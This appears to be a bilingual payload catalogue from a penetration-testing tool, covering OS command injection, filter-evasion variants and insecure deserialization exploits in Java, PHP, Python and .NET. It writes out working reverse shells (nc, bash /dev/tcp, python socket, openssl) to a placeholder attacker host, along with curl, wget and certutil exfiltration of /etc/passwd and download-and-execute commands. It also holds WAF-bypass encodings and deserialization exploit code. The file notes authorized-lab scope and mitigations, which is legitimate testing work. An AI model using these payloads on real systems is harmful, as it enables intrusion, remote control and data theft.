name.zh: 操作系统命令注入无害标记

description.zh: 覆盖操作系统命令注入的探测与利用：从基础注入点探测与 Linux/Windows 命令拼接，到时间盲注延时确认，再到外带数据回传，并附空格、关键字与编码绕过变体。
description.en: Covers probing and exploitation of OS command injection: from basic injection-point detection and Linux/Windows command chaining through time-based blind confirmation to out-of-band data exfiltration, with space, keyword, and encoding bypass variants.

overview.zh: 操作系统命令注入覆盖把用户输入拼入 Shell 命令的攻击场景：注入点接收参数后由操作系统解释执行。包含分隔符探测、Linux 与 Windows 命令执行、时间盲注延时确认、HTTP/DNS 外带回传五类验证维度，并附空格、关键字与编码绕过变体。
overview.en: OS command injection covers scenarios where user input is concatenated into shell commands: the injection point hands parameters to an operating-system interpreter. It spans five verification dimensions—separator probing, Linux and Windows command execution, time-based blind confirmation, and HTTP/DNS out-of-band exfiltration—plus space, keyword, and encoding bypass variants.

vulnerability.zh: 根因是应用把不可信输入拼进交给 Shell 的命令字符串，未使用参数数组或固定 API，分号、管道、反引号等控制符因此从数据升级为命令语法，缺少对控制字符与元字符的结构化校验。
vulnerability.en: The root cause is that the application concatenates untrusted input into the command string handed to a shell without argument arrays or fixed APIs, so separators such as semicolons, pipes, and backticks escalate from data to command syntax, with no structural validation of control characters or metacharacters.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步的分号、管道、反引号与 $() 载荷探测注入点，出现 uid= 或与基线的可辨识差异即确认可控；再用第 2、3 步在 Linux 与 Windows 上以 whoami、cat /etc/passwd、type win.ini 验证执行；无回显时用第 4 步延时观察耗时，第 5 步把输出经 HTTP/DNS 外带。占位符在全局变量菜单替换；被 WAF 拦截时改用空格、关键字与编码变体。
exploitation.en: Use payloads in list order: probe the injection point with step 1's semicolon, pipe, backtick, and $() payloads—uid= output or a recognizable baseline difference confirms control; verify execution on Linux and Windows via steps 2-3 with whoami, cat /etc/passwd, and type win.ini; without echo, watch step 4's delay and exfiltrate output via HTTP/DNS with step 5. Replace placeholders in the global variables menu; on WAF blocks use the space, keyword, and encoding variants.

mitigation.en: Avoid building shell commands by concatenation: use language-native argument arrays or fixed APIs, validate input by type and allowlist, and reject control characters; run least-privileged and restrict child processes and outbound traffic. After the fix, replay all separator samples and delay payloads from step 1 and confirm responses match the baseline with no anomalous child processes in logs.

description.zh: 将 id 依次拼接在分号、竖线、反引号、$()、&&、|| 六种分隔符后提交到可疑参数。命中判据：响应出现 uid=… 输出或与正常请求存在可辨差异。
description.en: Submit id appended after six separators (; | backtick $() && ||) to the suspect parameter. Success: response shows uid= output or a distinguishable diff.

title.zh: 确认执行身份与读取能力
title.en: Confirm execution identity and read access

description.zh: 用第 1 步命中的分隔符执行 whoami、id 并读取 /etc/passwd 与根目录列表，摸清 Web 服务账户权限。命中判据：响应返回用户名或 passwd 内容。
description.en: Using the separator that hit in step 1, run whoami, id and read /etc/passwd to map the service account. Success: username or passwd content returned.

attackChain.payload:
; whoami
; id
; cat /etc/passwd
; ls -la /
; nc -e /bin/bash {ATTACKER_HOST} {LPORT}
; bash -i >& /dev/tcp/{ATTACKER_HOST}/{LPORT} 0>&1

description.zh: 对无回显入口改注 sleep 5、ping -c 5 与 timeout 5，用响应耗时差判断命令是否真实执行。命中判据：注入请求耗时稳定增加约 5 秒。
description.en: For non-echoing inputs switch to sleep 5 / ping -c 5 / timeout 5 and judge by timing. Success: response latency grows by about 5 seconds.

title.zh: 变形命令绕过关键字过滤

description.zh: 命令名被过滤时用引号拆分、反斜杠转义与通配符路径重组 cat 等命令再执行。命中判据：变形后仍返回文件内容或命令输出。
description.en: When command names are filtered, rebuild cat via quote splitting, escapes and wildcard paths. Success: obfuscated form still returns output.

title.zh: 外带数据建立回传通道
title.en: Exfiltrate data over HTTP and DNS

description.zh: 用 curl、wget 把 whoami、id 输出编码进 URL 参数外带，或用 nslookup 把结果拼进子域名走 DNS 通道回传。命中判据：接收端日志出现携带数据的请求。
description.en: Exfiltrate whoami/id output via curl/wget URL params or nslookup subdomains. Success: collector logs receive the data.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 操作系统命令注入无害标记 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for OS Command Injection Harmless Marker are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: 操作系统命令注入无害标记只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: OS Command Injection Harmless Marker is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 命令注入只执行 marker 回显与 sleep 定时——禁用任何写文件与网络外连形态；时间盲注次数控制在个位数。
opsecTips.en: Restrict injection to marker echo and sleep timing — no file writes or outbound connections, and keep timing-blind attempts to single digits.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 用 {cat,..}、$IFS、重定向与 %09/${IFS} 等写法替代空格读取 /etc/passwd。命中判据：响应包含 /etc/passwd 内容（root:x:0:0:…）。
description.en: Replace spaces with {cat,..}, $IFS, redirection, and %09/${IFS} styles to read /etc/passwd. Success check: the response contains /etc/passwd content (root:x:0:0:...).

title.en: Validation step 2 for OS Command Injection Harmless Marker

description.zh: 用空引号、反斜杠与通配符拆分 cat 关键字后读取 /etc/passwd。命中判据：响应包含 /etc/passwd 内容且请求中未出现完整 cat 字样。
description.en: Split the cat keyword with empty quotes, backslashes, and globs, then read /etc/passwd. Success check: the response contains /etc/passwd content while the full string cat never appears in the request.

description.zh: 以 Base64 管道解码或 printf 十六进制还原命令后执行 cat /etc/passwd。命中判据：响应包含 /etc/passwd 内容且明文命令未出现在请求中。
description.en: Rebuild cat /etc/passwd via a Base64 pipe or printf hex decoding and execute it. Success check: the response contains /etc/passwd content and no plaintext command appears in the request.

title.en: Validation step 1 for Shell IFS Whitespace-Substitution Injection

description.zh: $IFS 绕过包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：$IFS 变体仍执行命令并返回对应输出（如 cat /flag 的内容）。
description.en: Run this Shell IFS Whitespace-Substitution Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: the $IFS variants still execute and return the matching output (e.g. the contents of cat /flag).

explanation.en: Falls back to space when IFS empty
IFS replaces space to read flag

description.zh: 用 ?、[]、* 通配符重组 /bin/cat 等路径执行读取，并配合 wget/curl 下载变体。命中判据：响应包含 /etc/passwd 内容（root:x:0:0:…）。
description.en: Rebuilds /bin/cat-style paths with ?, [], and * globs for reads, plus wget/curl download variants. Success check: the response contains /etc/passwd content (root:x:0:0:...).

title.zh: 通配符与子串展开绕过

description.zh: 以单字符通配重组 cat/bash 路径（完整样例见本条 command：/?at、目录段与命令名内的多段单 ? 通配），并以 ${PATH:0:1} 子串展开重建斜杠（bash ≥3），规避对 cat、/bin/cat、/etc/passwd 完整字面与 /bin/ca? 单点 glob 特征的规则；${PATH:0:1} 在标准 Linux PATH 下展开为 /。命中判据：响应含 root:x:0:0 或监听器收到回连，且请求不含 cat、/etc/passwd 字面。
description.en: Rebuilds cat and bash paths through single-character globs (full samples in the command of this entry: /?at plus multi-segment single-? runs over the directory path and the command name) and reconstructs slashes from the ${PATH:0:1} substring (bash 3+), dodging rules that match the full literals cat, /bin/cat, /etc/passwd or the single /bin/ca? glob; ${PATH:0:1} expands to / on standard Linux PATH settings. Success: root:x:0:0 in the response or a callback on the listener, with no literal cat or /etc/passwd in the request.

description.zh: 以 %0a、%0d%0a、%09 等控制字符替代分隔符或空格执行 cat。命中判据：响应包含 /etc/passwd 内容。
description.en: Uses control characters such as %0a, %0d%0a, and %09 in place of separators or spaces to run cat. Success check: the response contains /etc/passwd content.

title.zh: WAF 绕过：换行符Tab WAF绕过

description.zh: 换行与 Tab 的组合编码（%0a%09、%0d%0a%09、%09%0a）在一条载荷内同时呈现两种控制符，针对只匹配单控制符或单一 %0a 形态的规则；$(printf) 在 shell 层生成真实 Tab 字节，不依赖传输层编码。命中判据：passwd 内容返回，且原始请求中未见裸空格分隔 cat 与路径。
description.en: Combined newline-plus-tab encodings (%0a%09, %0d%0a%09, %09%0a) present two control characters in one payload against rules matching single separators or lone %0a; $(printf) emits a real tab byte at the shell layer without relying on transport encoding. Success: passwd content returned with no bare space separating cat from its path in the raw request.

description.zh: 空变量 $u 拆词、glob 重组、引号拆分与注释截断的合集；原第 9 条过滤器复测条目的 /bin/cat$u 行并入本集合统一维护。命中判据：passwd 内容返回或回连建立，且请求不含未拆分的 cat /etc/passwd 字面。
description.en: A collection of empty-variable $u word splits, glob rebuilds, quote splitting, and comment truncation; the /bin/cat$u line from the retired retest entry is consolidated here. Success: passwd content returned or a callback established, with no unsplit cat /etc/passwd literal in the request.

title.zh: Shell 词法混淆管道变体

description.zh: 把 $u 空变量推进管道段与引号内部：管道前的 base64/nc 与 $u 同现、引号内插 $u 使 cat 以 c$u'a't 形态出现，规避对整行 cat /etc/passwd 及管道外单点 $u 特征的规则。命中判据：passwd 的 base64 回显或内容返回，且 cat 以拆分形态出现。
description.en: Pushes the empty $u variable into pipe segments and inside quotes: base64 and nc share the pipe with $u, and c$u'a't splits cat across a quoted span, evading full-line cat /etc/passwd signatures and single-position $u checks. Success: base64 echo of passwd or its content returned with cat present only in split form.

description.zh: 将反弹 Shell 命令 Base64 编码后经 echo|base64 -d|bash 解码执行，验证绕过对明文反弹命令关键字的过滤。复制后需将 Base64 解码内容中的回连 IP 与端口改为自有监听地址并重新编码。命中判据：过滤器放行该请求且监听器收到反弹连接。
description.en: Base64-encodes a reverse-shell command and runs it through echo|base64 -d|bash to bypass plaintext-keyword filtering. After copying, change the callback IP and port inside the Base64-decoded content to your own listener and re-encode. Success check: the filter lets the request pass and the listener receives the reverse connection.

explanation.zh: 解码 Base64 编码的载荷
解码后的反弹 Shell 命令

description.zh: 以反斜杠与引号拆分构造 sleep 字面（slee\p、s'l'e'e'p、sl''eep），在时间盲注确认注入点的同时规避对 sleep 明文的黑名单；语义为时间盲注探测，需对比基线响应时间。命中判据：响应延时约 5 秒而基线即时返回。
description.en: Builds sleep literals through backslash and quote splits (slee\p, s'l'e'e'p, sl''eep) so time-based probing both confirms the injection point and dodges plaintext sleep blacklists; this is time-blind probing, so compare against a baseline response time. Success: response delayed roughly 5 seconds while the baseline returns immediately.

description.zh: 语义为 DNS 外带验证通道而非注入绕过：以 base64/hex 编码的 whoami、id 作子域回传，与执行集的 nslookup $(whoami) 明文行去重，host/dig 解析器差异化。命中判据：DNS 日志中出现携带编码数据的子域查询。
description.en: A DNS out-of-band verification channel rather than an injection bypass: base64-encoded whoami and id ride out as subdomain labels, deduplicated against the plaintext nslookup line in the execution set while host and dig vary the resolver. Success: DNS logs show subdomain queries carrying the encoded data.

wafBypass.command:
; curl -d @/etc/passwd http://{ATTACKER_HOST}/
; wget --post-file=/etc/passwd http://{ATTACKER_HOST}/
; curl -T /etc/passwd http://{ATTACKER_HOST}/
& certutil -urlcache -f http://{ATTACKER_HOST}/?data=%USERNAME%

description.zh: HTTP 外带去重后保留文件级回传能力：POST 体（curl -d @）、wget --post-file 与 PUT（curl -T）三条通道可整文件外传，certutil 覆盖 Windows 侧；与执行集的 $(whoami) 参数拼接行不重叠。命中判据：攻击端收到含 passwd 内容的请求体。
description.en: Deduplicated to file-grade exfiltration: POST body (curl -d @), wget --post-file, and PUT (curl -T) move whole files out while certutil covers Windows; no overlap with the execution set $(whoami) query lines. Success: the attacker endpoint receives a request body containing the passwd content.

explanation.zh: 命令拼接curl外带whoami执行结果
Windows环境变量取当前用户名

description.zh: 语义定位：ICMP 外带数据回传验证通道，不是请求层 WAF 绕过手法；ping -p 携带十六进制载荷适用于出站仅放行 ICMP 的环境。命中判据：攻击端抓包收到携带编码载荷的 ICMP 报文。
description.en: Semantic note: an ICMP out-of-band exfiltration channel, not a request-layer WAF bypass; ping -p carrying hex payloads fits egress rules that only allow ICMP. Success: a packet capture on the attacker side shows ICMP payloads with the encoded data.

explanation.zh: 以自定义十六进制载荷发送 ICMP 包
explanation.en: Send ICMP packets with a custom hex payload

explanation.zh: 把数据转换为十六进制字符串
explanation.en: Convert data to a hex string

explanation.zh: 在攻击者网卡抓取 ICMP 包还原外带数据
explanation.en: Capture ICMP packets on the attacker NIC to recover exfiltrated data

wafBypass.command:
; python -c "import socket,subprocess,os;s=socket.socket();s.connect(('{ATTACKER_HOST}',{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
; openssl s_client -quiet -connect {ATTACKER_HOST}:{LPORT} 2>/dev/null | /bin/bash | openssl s_client -quiet -connect {ATTACKER_HOST}:{LPORT} 2>/dev/null
; mkfifo /tmp/payloader.f; cat /tmp/payloader.f | /bin/bash 2>&1 | nc {ATTACKER_HOST} {LPORT} > /tmp/payloader.f; rm -f /tmp/payloader.f

description.zh: 去重后保留 python socket 全双工行，补两条 nc -e 不可用时的真实形态：openssl s_client 双管道加密反弹与 fifo 具名管道回接。命中判据：监听器收到 shell 会话，且请求侧无 bash /dev/tcp、nc -e 明文特征。
description.en: Keeps the python socket full-duplex line after deduplication and adds two real forms for hosts without nc -e: an encrypted openssl s_client double pipe and a fifo named-pipe loopback. Success: the listener gets a shell session with no bash /dev/tcp or nc -e literals on the wire.

explanation.zh: python建立socket并把标准IO重定向到连接

description.zh: cmd.exe 在解析期把 ^ 视为转义符并丢弃，w^h^o^a^m^i 拼接后仍执行 whoami、t^y^p^e 仍执行 type，可绕过对 whoami、type、win.ini 等完整命令词与路径的正则黑名单；仅适用于 cmd.exe 解释器执行路径，PowerShell 与 POSIX shell 不适用。命中判据：回显当前用户名与 win.ini 内容。
description.en: cmd.exe treats ^ as an escape character and drops it during parsing, so w^h^o^a^m^i still runs whoami and t^y^p^e still runs type, evading regex blacklists keyed on whole words such as whoami, type, or the win.ini path; applies only to cmd.exe interpreter paths, not to PowerShell or POSIX shells. Success: the response shows the current user and win.ini contents.

explanation.zh: cmd 自身拆分后带 /c 执行
转义拆分的 type 读取

title.zh: 替代读取器与 $IFS 间隔

description.zh: 用 tac、more、head 等非 cat 读取器配合 $IFS 间隔重建读文件链路，绕过对 cat 二进制名与空格分隔特征的检测；tac 反向输出、more 分页输出、head 截断输出均回传 passwd 片段。命中判据：响应出现 root:x:0:0 等 passwd 行内容。
description.en: Rebuilds the file-read chain with non-cat readers (tac, more, head) separated by the shell internal field separator variable, evading detections keyed on the cat binary name and on space separators; tac prints lines reversed, more paged, and head truncated, yet all still return passwd content. Success: the response contains passwd lines such as root:x:0:0.

explanation.zh: tac 反序读取并以 IFS 代空格
explanation.en: tac read with IFS in place of spaces

explanation.zh: bash 内部字段分隔符展开为空格
explanation.en: bash internal field separator expands to a space

explanation.zh: head 截断读取前 64 字节

title.zh: find 管道 xargs 组合读取
title.en: find Piped to xargs Read Chain

description.zh: 以 find 按通配符定位目标文件再经管道交给 xargs 批量执行 cat，把读文件动作从注入语句里的直接调用改为工具链组合，绕过对独立 cat /etc/passwd 连写特征的规则；GNU xargs 的 -a 参数还可直接以文件为输入源。命中判据：响应返回 passwd 内容。
description.en: Locates the target file with a find wildcard and hands it to xargs through a pipe, so the read happens as a tool-chain combination instead of a direct cat /etc/passwd call inside the injection string, evading rules keyed on that contiguous signature; GNU xargs -a can also take the file as the direct input source. Success: passwd content is returned.

explanation.zh: 管道交由 xargs 批量执行
GNU 扩展直接以文件为输入源
explanation.en: GNU extension takes the file as input source

title.en: Validation step 1 for OS Command Injection Harmless Marker

execution.command:
; id
| id
`id`
$(id)
&& id
|| id
test;id
test|id

description.zh: 在注入点分别以 ;、|、反引号、$()、&&、|| 执行 id，探测命令注入点。命中判据：响应包含 id 的输出（uid=…）或与基线响应出现可辨识差异。
description.en: Execute id through ;, |, backticks, $(), &&, and || at the injection point to probe for command injection. Success check: the response contains id output (uid=...) or a recognizable difference from the baseline.

title.en: Validation step 2 for OS Command Injection Harmless Marker

execution.command:
; whoami
; id
; cat /etc/passwd
; ls -la /
; nc -e /bin/bash {ATTACKER_HOST} {LPORT}
; bash -i >& /dev/tcp/{ATTACKER_HOST}/{LPORT} 0>&1

description.zh: 在 Linux 注入点执行 whoami、id、cat /etc/passwd 与目录列举，nc/bash 反弹行仅用于已授权监听器场景。命中判据：响应包含当前用户名、uid=… 或 /etc/passwd 内容；反弹 Shell 在监听器上获得会话。
description.en: Run whoami, id, cat /etc/passwd, and directory listing at a Linux injection point; the nc/bash reverse-shell lines apply only with an authorized listener. Success check: the response contains the current username, uid=..., or /etc/passwd content, and a reverse shell lands on the listener.

title.en: Validation step 3 for OS Command Injection Harmless Marker

execution.command:
& whoami
& dir
& type C:\windows\win.ini
& certutil -urlcache -split -f http://{ATTACKER_HOST}/shell.exe shell.exe & shell.exe
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://{ATTACKER_HOST}/shell.ps1')"

description.zh: 判据: 在 Windows 注入点执行 whoami、dir、type win.ini 与 certutil/powershell 下载执行。命中判据：whoami/dir/type 行响应包含当前用户名、目录列表或 win.ini 内容；certutil/powershell 行以攻击者 HTTP 日志出现 shell.exe/shell.ps1 下载请求且后续命令执行为命中。
description.en: Run whoami, dir, type win.ini, and certutil/powershell download-exec at a Windows injection point. Success check: the response contains the current username, a directory listing, or win.ini content, and the attacker HTTP log records the shell.exe/shell.ps1 fetch.

description.zh: 以 ;/& 注入 sleep 5、ping -c 5 与 timeout 5 三种延时命令，通过响应耗时差验证注入点真实存在。
description.en: Inject sleep 5, ping -c 5, and timeout 5 through ; and & and use response-time deltas to confirm the injection point.

title.en: Validation step 5 for OS Command Injection Harmless Marker

description.zh: 通过 curl/wget 与 nslookup/ping 把命令输出经 HTTP 或 DNS 发往攻击者侧收集端。命中判据：攻击者 HTTP 访问日志或 DNS 权威日志收到包含 whoami/id 输出的请求。
description.en: Exfiltrate command output over HTTP or DNS to the attacker collector via curl/wget and nslookup/ping. Success check: the attacker HTTP access log or DNS authoritative log receives requests carrying whoami/id output.

name.zh: 多语言不安全反序列化

description.zh: 覆盖多语言不安全反序列化验证：从 ysoserial 生成 Java CommonsCollections 载荷，到 PHP __destruct POP 链、Python __reduce__ 与 .NET 载荷，确认各运行时可利用性。
description.en: Covers exploitation validation of insecure deserialization across runtimes: from ysoserial-generated Java CommonsCollections payloads through PHP __destruct POP chains, Python __reduce__, and .NET payloads, confirming exploitability per runtime.

overview.zh: 不安全反序列化类型边界针对把不可信序列化数据直接还原为运行时对象的场景，覆盖 Java、PHP、Python 与 .NET 四个生态。验证 ysoserial 链、PHP __destruct POP 链、Python __reduce__ 与 .NET ObjectDataProvider 四类利用路径。
overview.en: The unsafe deserialization type boundary targets scenarios where untrusted serialized data is restored directly into runtime objects, spanning Java, PHP, Python, and .NET. It validates four exploitation paths: ysoserial chains, PHP __destruct POP chains, Python __reduce__, and .NET ObjectDataProvider.

vulnerability.zh: 根因是应用对不可信数据调用反序列化且未限制可还原类型，序列化流中的类与魔术方法（readObject/__destruct/__reduce__ 等）在业务校验前被实例化或调用，类路径中的 gadget 可组合为代码执行。
vulnerability.en: The root cause is deserializing untrusted data without type restrictions; classes and magic methods in the stream (readObject/__destruct/__reduce__, etc.) are instantiated or invoked before business validation, and classpath gadgets combine into code execution.

exploitation.zh: Java 目标用第 1 步 ysoserial CommonsCollections1 生成下载载荷投递（Runtime.exec 不解析管道，命令用 curl -o 落盘或 bash -c {echo,…}|{base64,-d}|{bash,-i} 组合形式），以 HTTP 日志收到 shell.sh 请求为命中；PHP 用第 2 步构造 __destruct POP 链，Python 用第 3 步 __reduce__ 返回 os.system，.NET 用第 4 步 ObjectDataProvider 配合 Json.Net。被签名拦截时改用重签名变体。
exploitation.en: For Java, generate the curl|bash payload with step 1's ysoserial CommonsCollections1—a shell.sh request in your HTTP log is a hit; for PHP build step 2's __destruct POP chain, for Python step 3's __reduce__ returning os.system, and for .NET step 4's ObjectDataProvider with Json.Net. If signature checks block the payload, use the re-signed variant.

mitigation.en: Stop native deserialization of untrusted data and migrate to data formats like JSON; where compatibility is required, restrict allowed types, verify signatures, isolate the loading process, and remove dangerous gadget dependencies. After the fix, replay the step 1-4 payloads and confirm rejection with no anomalous class loading or child processes.

description.zh: 枚举 Cookie、请求体与接口中的序列化数据字段，判断目标是 Java、PHP 还是 Python 栈。命中判据：畸形序列化串引发解析报错。
description.en: Hunt serialized blobs in cookies/bodies/APIs and fingerprint the stack. Success: malformed blobs trigger parser errors.

title.zh: 投递 Java gadget 载荷

description.zh: 用 ysoserial 生成 CommonsCollections 载荷投向 Java 入口，命令为下载脚本落盘（组合命令用 bash -c {echo,…}|{base64,-d}|{bash,-i} 形式）。命中判据：HTTP 日志收到 /shell.sh 请求或目标侧出现执行痕迹。
description.en: Generate a CommonsCollections payload whose command curls and pipes a script. Success: collector sees the fetch or execution occurs.

description.zh: 定义 __destruct 中 eval 命令的 Exploit 类并输出序列化串投递。命中判据：反序列化后返回 whoami 输出。
description.en: Define a __destruct POP chain and submit its serialized form. Success: whoami output returns after unserialize.

title.zh: 构造 Python pickle 载荷

description.zh: 用 __reduce__ 返回 os.system 与命令元组并 dumps 输出，投向 Python 入口。命中判据：目标执行命令并回显。
description.en: Build a __reduce__ pickle mapping to os.system and deliver it. Success: the command executes and echoes.

description.zh: 入口校验 HMAC 签名时，用泄露的密钥对载荷重新计算签名后提交。命中判据：重签后的载荷被接受并触发执行。
description.en: When the entry verifies HMAC, recompute the signature with the leaked key. Success: the re-signed payload is accepted and fires.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 不安全反序列化类型边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Unsafe Deserialization Type Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: 不安全反序列化类型边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Unsafe Deserialization Type Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 反序列化载荷会真实执行命令——限定 marker/回显动作；ysoserial 产物在验证后从两端清除。
opsecTips.en: Deserialization payloads really execute commands — restrict actions to marker echo, and remove ysoserial artifacts from both ends afterwards.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

opsecTips: 版本边界：CommonsCollections1 gadget 仅适用于 Java 8u71 之前的 JDK；8u71+ 需改用 CC6/CC7 链，否则反序列化不触发。

HMAC re-signing bypasses application-layer signature verification and presumes the signing key is known; it never touches a request-layer WAF.

title.zh: ysoserial 生成命令执行载荷
title.en: Generate a command-execution payload with ysoserial

description.zh: 判据: 以 CommonsCollections1 链生成下载脚本的序列化载荷（Runtime.exec 不经过 Shell，管道符无效；需组合命令时改用 bash -c {echo,<Base64>}|{base64,-d}|{bash,-i} 写法）。命中判据：攻击者 HTTP 日志收到目标对 /shell.sh 的请求，且目标侧 /tmp/shell.sh 落盘或出现命令执行痕迹。
description.en: Generate a CommonsCollections1 serialized payload that pipes a downloaded script into bash, verifying the Java deserialization sink reaches command execution. Success check: the attacker HTTP log records the target fetching shell.sh, or the target shows the corresponding command-execution trace.

execution.command:
<?php
class Exploit {
public $cmd = "system('whoami');";
function __destruct() {
eval($this->cmd);
}
}
echo serialize(new Exploit());
?>

description.zh: 判据: 定义 __destruct 中 eval 执行命令的 Exploit 类并输出其序列化串，验证反序列化点还原对象后自动触发命令执行。命中判据：反序列化执行后返回 whoami 输出。
description.en: Define a two-level Chain-Action call chain fired from __destruct and print its serialization, verifying the deserialization sink executes system when the chain is restored.

description.zh: 用 __reduce__ 返回 (os.system, ('whoami',)) 并以 pickle.dumps 输出载荷，验证 Python 反序列化点直接映射到命令执行。
description.en: Return (os.system, ('whoami',)) from __reduce__ and emit it with pickle.dumps, verifying the Python deserialization sink maps straight to command execution.

description.zh: 以 ObjectDataProvider gadget 配合 Json.Net 格式生成弹出 calc.exe 的 .NET 反序列化载荷，验证 Json.NET 反序列化点可触发执行。命中判据：目标主机出现计算器进程。

name.zh: Java 反序列化 Gadget 链

description.zh: 覆盖 Java 反序列化 Gadget 链验证：从 CommonsCollections、Spring 等六条链试链，到 ysoserial 生成执行与反弹载荷，再到 JRMP 监听回连利用，确认目标 JDK 可用链。
description.en: Covers Gadget-chain validation for Java deserialization: from trial-firing six chains including CommonsCollections and Spring through ysoserial-generated execution and reverse-shell payloads to JRMP listener callback exploitation, confirming usable chains on the target JDK.

overview.zh: Java 反序列化类型边界针对 ObjectInputStream 还原不可信流的场景：类路径中的 gadget 链在 readObject 阶段触发。覆盖 CommonsCollections、Spring 等六链试链、ysoserial 生成执行与反弹载荷、JRMP 回连四类验证维度。
overview.en: The Java deserialization type boundary targets ObjectInputStream restoring untrusted streams, where classpath gadget chains trigger during readObject. It covers four verification dimensions: chain trials across CommonsCollections, Spring, and four others; ysoserial-generated execution and reverse payloads; and JRMP callback exploitation.

vulnerability.zh: 根因是应用接受不可信序列化流且 ObjectInputFilter 缺失或过宽，类路径中的 CommonsCollections 等库提供可组合的反射与调用 gadget，readObject 期间即可执行任意命令或建立回连。
vulnerability.en: The root cause is accepting untrusted serialization streams with missing or overly broad ObjectInputFilter; classpath libraries such as CommonsCollections supply composable reflection and invocation gadgets, enabling arbitrary command execution or callbacks during readObject.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步六链清单逐条生成序列化文件试链并记录可用链；再用第 2 步生成执行或反弹载荷投递，命中判据为 HTTP 日志收到 shell.sh 请求或监听器获得会话；直连受限时用第 3 步 JRMPListener 配合 JRMPClient 回连。高版本 JDK 报模块错误时改用 --add-opens 变体。
exploitation.en: Use payloads in list order: trial step 1's six-chain list by generating serialization files and record the working chain; then generate execution or reverse payloads with step 2—a shell.sh request in HTTP logs or a listener session is a hit; when direct connections are restricted, pair step 3's JRMPListener with the JRMPClient callback. Use the --add-opens variant for module errors on newer JDKs.

mitigation.en: Stop using native Java serialization across trust boundaries; during migration configure process-level and stream-level ObjectInputFilters allowing only minimal business types; remove unneeded gadget dependencies and isolate deserialization. After the fix, replay the step-1 and step-2 payloads and confirm filtering takes effect with no anomalous class loading or child processes.

name.zh: PHP 反序列化与 POP 链

description.zh: 覆盖 PHP 反序列化的利用边界验证：从魔术方法触发点定位与 POP 链构造，到 Phar 元数据载荷投递，再到 Session 处理器混用注入，并附属性可见性前缀对照，用于确认反序列化到代码执行的链路。
description.en: Covers PHP deserialization exploitation boundaries: from magic-method trigger mapping and POP chain construction through Phar metadata payload delivery to session-handler mixing injection, with property-visibility prefix controls, confirming the path from deserialization to code execution.

overview.zh: PHP 反序列化类型边界针对 unserialize 接受不可信数据的场景：魔术方法与对象链在还原时被触发。覆盖魔术方法触发点定位、POP 链构造、Phar 元数据投递与 Session 处理器混用四类路径，并附属性可见性前缀对照。
overview.en: The PHP deserialization type boundary targets unserialize accepting untrusted data, where magic methods and object chains trigger during restoration. It covers four paths—magic-method trigger points, POP-chain construction, Phar metadata delivery, and session-handler mixing—plus property-visibility prefix comparison.

vulnerability.zh: 根因是不可信字符串进入 unserialize 且 allowed_classes 未限制，__wakeup、__destruct 等魔术方法在对象还原时自动执行；存在可控调用链时，属性值可沿 POP 链传递到 system 等危险函数。
vulnerability.en: The root cause is untrusted strings entering unserialize without allowed_classes restrictions, so magic methods like __wakeup and __destruct execute automatically during restoration; with a controllable call chain, property values travel the POP chain into dangerous functions such as system.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步脚本确认 __wakeup/__destruct 的自动触发；再用第 2 步 Chain→Action POP 链输出序列化串投递，返回 whoami 输出即命中；有文件操作函数时第 3 步生成 exploit.phar 经 phar:// 触发；会话处理器混用时第 4 步竖线注入。被拦截时按属性可见性前缀调整序列化串。
exploitation.en: Use payloads in list order: confirm automatic __wakeup/__destruct triggering with step 1's script; deliver step 2's Chain→Action POP chain serialized string—returned whoami output is a hit; with file operations present, trigger step 3's exploit.phar via phar://; with mixed session handlers, use step 4's pipe injection. Adjust the serialized string with property-visibility prefixes when blocked.

mitigation.en: Stop calling unserialize on untrusted data and use JSON instead; where compatibility is required, set allowed_classes=false or a minimal class set, verify signatures, unify session handlers, and upgrade PHP. After the fix, replay the step 1-4 samples and confirm object chains are rejected with no magic-method side effects.

description.zh: 提交带 __wakeup 与 __destruct 的序列化对象，确认魔术方法在反序列化时自动执行。命中判据：响应出现对应方法的输出。
description.en: Submit objects with __wakeup/__destruct to confirm auto-triggering. Success: method output appears in the response.

attackChain.payload:
<?php
class Demo {
    public $data;
    function __wakeup() { echo "wakeup\n"; }
    function __destruct() { echo "destruct\n"; }
}
